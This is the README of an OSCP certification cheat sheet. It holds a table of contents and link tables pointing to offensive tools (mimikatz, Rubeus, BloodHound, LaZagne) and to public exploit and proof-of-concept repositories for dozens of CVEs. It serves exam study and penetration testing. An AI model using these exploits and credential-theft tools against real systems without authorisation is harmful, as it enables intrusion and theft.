<p align="center">
  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/images/kali-linux.svg">
</p>

# OSCP Cheat Sheet

![GitHub commit activity (branch)](https://img.shields.io/github/commit-activity/m/0xsyr0/OSCP) ![GitHub contributors](https://img.shields.io/github/contributors/0xsyr0/OSCP)

Commands, Payloads and Resources for the OffSec Certified Professional Certification (OSCP).

---

Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [Twitter](https://twitter.com/syr0_) for suggestions.

Every help or hint is appreciated!

---

**DISCLAIMER**: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!

I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you **Muztahidul Tanim** for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.

Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.

---

**END NOTE**: This repository will also try to cover as much as possible of the tools required for the proving grounds boxes.

---

Thank you for reading.

<br>

## Table of Contents

- [Basics](https://github.com/0xsyr0/OSCP#basics)
- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering)
- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis)
- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis)
- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks)
- [Reverse Engineering](https://github.com/0xsyr0/OSCP#reverse-engineering)
- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools)
- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation)
- [Exploit Databases](https://github.com/0xsyr0/OSCP#exploit-databases)
- [CVEs](https://github.com/0xsyr0/OSCP#cves)
- [Payloads](https://github.com/0xsyr0/OSCP#payloads)
- [Wordlists](https://github.com/0xsyr0/OSCP#wordlists)
- [Social Media Resources](https://github.com/0xsyr0/OSCP#social-media-resources)
- [Commands](https://github.com/0xsyr0/OSCP#commands)
	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
		- [curl](https://github.com/0xsyr0/OSCP#curl)
		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
  		- [FTP](https://github.com/0xsyr0/OSCP#ftp)
		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
		- [Ligolo-ng](https://github.com/0xsyr0/OSCP#ligolo-ng)
		- [Linux](https://github.com/0xsyr0/OSCP#linux)
		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
		- [Ping](https://github.com/0xsyr0/OSCP#ping)
		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
		- [RDP](https://github.com/0xsyr0/OSCP#rdp)
		- [showmount](https://github.com/0xsyr0/OSCP#showmount)
		- [smbclient](https://github.com/0xsyr0/OSCP#smbclient)
		- [socat](https://github.com/0xsyr0/OSCP#socat)
		- [SSH](https://github.com/0xsyr0/OSCP#ssh)
		- [Time and Date](https://github.com/0xsyr0/OSCP#time-and-date)
		- [Tmux](https://github.com/0xsyr0/OSCP#tmux)
		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
  		- [cadaver](https://github.com/0xsyr0/OSCP#cadaver)
		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
		- [GitTools](https://github.com/0xsyr0/OSCP#gittools)
		- [Local File Inclusion (LFI)](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
		- [PDF PHP Inclusion](https://github.com/0xsyr0/OSCP#pdf-php-inclusion)
		- [PHP Upload Filter Bypasses](https://github.com/0xsyr0/OSCP#php-upload-filter-bypasses)
		- [PHP Filter Chain Generator](https://github.com/0xsyr0/OSCP#php-filter-chain-generator)
		- [PHP Generic Gadget Chains (PHPGGC)](https://github.com/0xsyr0/OSCP#php-generic-gadget-chains-phpggc)
		- [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/OSCP#server-side-request-forgery-ssrf)
		- [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/OSCP#server-side-template-injection-ssti)
		- [Upload Vulnerabilities](https://github.com/0xsyr0/OSCP#upload-vulnerabilities)
		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
		- [MySQL](https://github.com/0xsyr0/OSCP#mysql)
		- [NoSQL Injection](https://github.com/0xsyr0/OSCP#nosql-injection)
		- [PostgreSQL](https://github.com/0xsyr0/OSCP#postgresql)
		- [Redis](https://github.com/0xsyr0/OSCP#redis)
		- [sqlcmd](https://github.com/0xsyr0/OSCP#sqlcmd)
		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
		- [sqlite3](https://github.com/0xsyr0/OSCP#sqlite3)
		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
	- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks-1)
		- [CrackMapExec](https://github.com/0xsyr0/OSCP#crackmapexec)
		- [fcrack](https://github.com/0xsyr0/OSCP#fcrack)
		- [hashcat](https://github.com/0xsyr0/OSCP#hashcat)
		- [Hydra](https://github.com/0xsyr0/OSCP#hydra)
		- [John](https://github.com/0xsyr0/OSCP#john)
		- [Kerbrute](https://github.com/0xsyr0/OSCP#kerbrute)
		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
		- [mimikatz](https://github.com/0xsyr0/OSCP#mimikatz)
		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
		- [ImageTragick](https://github.com/0xsyr0/OSCP#imagetragick)
		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
  		- [bloodyAD](https://github.com/0xsyr0/OSCP#bloodyAD)
		- [Certify](https://github.com/0xsyr0/OSCP#certify)
		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
		- [Impacket](https://github.com/0xsyr0/OSCP#impacket-1)
		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos-1)
		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
		- [Linux](https://github.com/0xsyr0/OSCP#linux-1)
		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows-1)
		- [PassTheCert](https://github.com/0xsyr0/OSCP#passthecert)
		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
		- [Powermad](https://github.com/0xsyr0/OSCP#powermad)
		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
		- [smbpasswd](https://github.com/0xsyr0/OSCP#smbpasswd)
		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
	- [CVE](https://github.com/0xsyr0/OSCP#cve)
		- [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/OSCP#cve-2014-6271-shellshock-rce-poc)
		- [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/OSCP#cve-2016-1531-exim-lpe)
		- [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2019-14287-sudo-bypass)
		- [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/OSCP#cve-2020-1472-zerologon-pe)
		- [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/OSCP#cve-2021-3156-sudo--sudoedit-lpe)
		- [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2021-44228-log4shell-rce-0-day)
		- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/OSCP#cve-2022-0847-dirty-pipe-lpe)
		- [CVE-2022-22963: Spring4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2022-22963-spring4shell-rce-0-day)
		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
		- [CVE-2022-31214: Firejail LPE](https://github.com/0xsyr0/OSCP#cve-2022-31214-firejail-lpe)
		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/OSCP#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
  		- [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/OSCP#cve-2023-4911-looney-tunables-lpe)
  		- [GodPotato LPE](https://github.com/0xsyr0/OSCP#godpotato-lpe)
		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
  		- [JuicyPotatoNG LPE](https://github.com/0xsyr0/OSCP#juicypotatong-lpe)
		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/OSCP#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
  		- [PrintSpoofer LPE](https://github.com/0xsyr0/OSCP#printspoofer-lpe)
		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
		- [Donut](https://github.com/0xsyr0/OSCP#donut)
		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
		- [GhostScript](https://github.com/0xsyr0/OSCP#ghostscript)
		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
		- [ScareCrow](https://github.com/0xsyr0/OSCP#scarecrow)
		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
	- [Templates](https://github.com/0xsyr0/OSCP#templates)
		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
		- [Exploit Skeleton Python Script](https://github.com/0xsyr0/OSCP#exploit-skeleton-python-script)
		- [JSON POST Rrequest](https://github.com/0xsyr0/OSCP#json-post-request)
		- [Python Pickle RCE](https://github.com/0xsyr0/OSCP#python-pickle-rce)
		- [Python Redirect for SSRF](https://github.com/0xsyr0/OSCP#python-redirect-for-ssrf)
		- [Python Web Request](https://github.com/0xsyr0/OSCP#python-web-request)
		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)

### Basics

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |

### Web Application Analysis

| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |
| ysoserial | https://github.com/frohoff/ysoserial |

### Password Attacks

| Name | URL |
| --- | --- |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| Patator | https://github.com/lanjelot/patator |
| pypykatz | https://github.com/skelsec/pypykatz |
| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |

### Reverse Engineering

| Name | URL |
| --- | --- |
| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
| binwalk | https://github.com/ReFirmLabs/binwalk |
| cutter | https://github.com/rizinorg/cutter |
| dnSpy | https://github.com/dnSpy/dnSpy |
| GEF | https://github.com/hugsy/gef |
| ghidra | https://github.com/NationalSecurityAgency/ghidra |
| ImHex | https://github.com/WerWolv/ImHex |
| JD-GUI | https://github.com/java-decompiler/jd-gui |
| peda | https://github.com/longld/peda |
| pwndbg | https://github.com/pwndbg/pwndbg |
| Radare2 | https://github.com/radareorg/radare2 |

### Exploitation Tools

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| ImageTragick | https://imagetragick.com |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |

### Post Exploitation

| Name | URL |
| --- | --- |
| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound Python | https://github.com/fox-it/BloodHound.py |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | https://github.com/rebootuser/LinEnum |
| LOLBAS | https://lolbas-project.github.io |
| lsassy | https://github.com/Hackndo/lsassy |
| nanodump | https://github.com/helpsystems/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| Villain | https://github.com/t3l3machus/Villain |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
